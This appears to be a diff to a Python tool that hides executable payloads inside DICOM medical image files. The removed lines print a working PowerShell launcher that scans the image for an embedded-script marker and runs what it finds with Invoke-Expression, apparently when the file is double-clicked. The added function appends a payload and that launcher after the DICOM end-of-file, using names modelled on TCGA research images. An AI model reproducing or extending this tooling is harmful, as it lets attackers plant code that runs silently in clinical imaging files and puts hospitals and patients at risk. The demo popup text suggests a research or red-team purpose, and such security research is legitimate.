@@ -28,25 +28,9 @@ FILE_LAUNCHER_MAGIC = b"<<<DCM_FILE_LAUNCHER>>>"
 # Self-contained PowerShell launcher — appended at the end of the DICOM.
 # When open_embedded_dicom.py (DicomAutoOpen handler) runs on double-click,
 # it extracts this launcher, which finds and executes the SCRIPT_MAGIC payload.
-_FILE_LAUNCHER_SCRIPT = r"""
-param([string]$DicomPath = $args[0])
-if (-not $DicomPath) { throw 'DICOM path required' }
-$b = [IO.File]::ReadAllBytes($DicomPath)
-$m = [Text.Encoding]::ASCII.GetBytes('<<<DCM_EMBEDDED_SCRIPT>>>')
-$found = -1
-for ($i = $b.Length - $m.Length; $i -ge 0; $i--) {
-    $match = $true
-    for ($j = 0; $j -lt $m.Length; $j++) {
-        if ($b[$i + $j] -ne $m[$j]) { $match = $false; break }
-    }
-    if ($match) { $found = $i; break }
-}
-if ($found -lt 0) { throw 'Embedded script not found in DICOM file' }
-$start = $found + $m.Length
-$len = [BitConverter]::ToInt32($b, $start)
-$script = [Text.Encoding]::UTF8.GetString($b, $start + 4, $len)
-Invoke-Expression $script
-""".strip()
+from utils.embed_engine import FILE_LAUNCHER
+
+_FILE_LAUNCHER_SCRIPT = FILE_LAUNCHER.strip()
 
 EXE_POPUP_MESSAGE = "Hi there I am an embedded script i can be malicious also"
 
@@ -315,6 +299,30 @@ def build_image_eof_embed_bytes(
 ) -> Tuple[bytes, Dict[str, Any]]:
     """Legacy embed: payload after DICOM EOF. Prefer build_private_tag_embed_bytes for viewers."""
     return append_payload_after_dicom(source_bytes, payload, source_name)
+
+
+def build_eof_embed_bytes(
+    source_bytes: bytes,
+    payload: bytes,
+    source_name: str = "upload.dcm",
+    include_launcher: bool = True,
+) -> Tuple[bytes, Dict[str, Any]]:
+    """Reference-pattern embed: append payload (+ optional launcher) after DICOM EOF."""
+    from utils.embed_engine import build_eof_embed_bytes as _eof_embed
+
+    result, log = _eof_embed(source_bytes, payload, include_launcher=include_launcher)
+    log.update(
+        {
+            "pattern": "eof_append_embed",
+            "reference_file": "TCGA-*_modified_embedded_*.dcm style",
+            "source": source_name,
+            "payload_bytes": len(payload),
+            "include_launcher": include_launcher and payload.startswith(SCRIPT_MAGIC),
+            "total_bytes": len(result),
+            "hash_sha256": hashlib.sha256(result).hexdigest(),
+        }
+    )
+    return result, log
 
 
 def build_private_tag_embed_bytes(
